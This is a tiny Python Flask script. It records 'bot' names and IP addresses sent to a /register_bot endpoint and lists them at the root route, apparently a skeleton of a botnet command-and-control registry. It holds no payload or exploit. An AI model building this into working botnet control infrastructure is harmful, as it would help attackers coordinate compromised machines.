# /usr/share/python3 

from flask import Flask, request

app = Flask(__name__)

bot_dict = {}

@app.route('/register_bot')
def register_bot():
    bot_name = request.args.get('bot_name')
    bot_ip = request.args.get('bot_ip')
    bot_dict[bot_name] = bot_ip
    return "200 OK"
    
@app.route('/')
def test():
    return bot_dict